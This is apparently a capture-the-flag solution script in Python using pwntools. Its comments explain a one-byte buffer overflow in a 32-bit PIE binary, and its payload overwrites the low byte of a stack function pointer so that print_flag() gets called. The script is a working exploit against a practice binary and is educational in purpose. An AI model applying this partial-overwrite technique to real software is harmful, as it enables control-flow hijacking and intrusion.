import pwn

# pwn2 is a 32-bit dynamically linked binary
# It has Full Relro, NX, PIE, ASLR is turned on

# This is an extremely easy exploit
# There is a buffer right next to a function pointer on the stack vulnerable to a buffer overflow
# We are able to overflow the lsb of the function pointer to have a print_flag() function called

# In the select_func() function, there is a buffer overflow bug which we can exploit
# 0x1f (31) bytes of user input are copied into a 30 byte buffer
# Immediately after the buffer on the stack is a function pointer functionCall
# functionCall is supposed to be either the function 'two' or 'one'. By default it is initialized to 'two'
# it is dereferenced and called at the end of select_func()
# Our 1 byte buffer overflow allows us to overwrite the lsb of functionCall

# There is a print_flag() function at offset 0x6d8
# The pie offset of the function 'two' is 0x6ad
# This means, overwriting just the lsb of the functionCall function pointer with 0xd8 will cause printFlag() to get called

target = pwn.process('./pwn2')

payload = b'a' * 30 # fill up the buffer completely
payload += b'\xd8' # one byte extra of overflow

target.sendline(payload)

out = target.recvuntil(b'}')
index = out.find(b'flag{')
print(out[index:])